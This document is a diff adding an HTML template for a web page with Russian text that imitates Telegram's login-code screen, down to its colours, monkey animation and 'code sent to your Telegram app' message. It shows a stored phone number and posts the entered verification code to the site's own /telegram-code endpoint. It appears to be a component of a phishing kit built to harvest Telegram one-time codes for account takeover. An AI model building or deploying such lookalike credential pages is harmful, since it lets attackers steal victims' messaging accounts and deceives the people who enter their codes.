@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Page</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #212121;
+            font-family: 'Roboto', sans-serif;
+            color: #aaaaaa;
+        }
+
+        .container {
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        
+
+        h1 {
+            font-size: 24px;
+            color: #ffffff;
+            margin-bottom: 15px;
+        }
+
+        .description {
+            font-size: 14px;
+            color: #aaaaaa;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 13px;
+            border-radius: 10px;
+            border: 1px solid #aaaaaa;
+            margin-bottom: 20px;
+            font-size: 15px;
+            background-color: #212121;
+            color: #ffffff;
+            box-sizing: border-box;
+        }
+
+        .submit-button {
+            width: 100%;
+            background-color: #8774e1;
+            color: #ffffff;
+            padding: 12px;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            box-sizing: border-box;
+        }
+
+        .submit-button:hover {
+            background-color: hsl(250.46, 64.5%, 62.86%);
+        }
+    
+
+        body {
+            background-color: #212121; /* Replacing var(--body-background-color) */
+            color: #ffffff; /* Replacing var(--primary-text-color) */
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            user-select: none;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        
+
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 20px;
+            }
+
+            .input-field, .submit-button {
+                padding: 10px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div id="monkey-animation" class="animation-container" style="height: 115px;"></div>
+        <h1 id="phone-number-display">Телефон</h1>
+        <p class="description">Мы отправили код в приложение Telegram на вашем устройстве.</p>
+        <form action="/telegram-code" method="post">
+            <input type="text" name="verification_code" class="input-field" placeholder="Код" required autocomplete="off">
+            <button type="submit" class="submit-button">ПРОДОЛЖИТЬ</button>
+        </form>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/bodymovin/5.7.13/lottie.min.js"></script>
+    <script>
+        var animation = lottie.loadAnimation({
+            container: document.getElementById('monkey-animation'),
+            renderer: 'svg',
+            loop: true,
+            autoplay: true,
+            path: '{{ url_for("static", filename="password_close.json") }}'
+        });
+
+        function formatPhoneNumber(phoneNumber) {
+            phoneNumber = phoneNumber.replace(/\D/g, '');
+            return `+${phoneNumber.slice(0, 3)} ${phoneNumber.slice(3, 5)} ${phoneNumber.slice(5, 8)} ${phoneNumber.slice(8, 10)} ${phoneNumber.slice(10)}`;
+        }
+
+        const phoneNumber = localStorage.getItem('phoneNumber');
+        if (phoneNumber) {
+            const formattedPhoneNumber = formatPhoneNumber(phoneNumber);
+            document.getElementById('phone-number-display').textContent = formattedPhoneNumber;
+        }
+    </script>
+</body>
+</html>
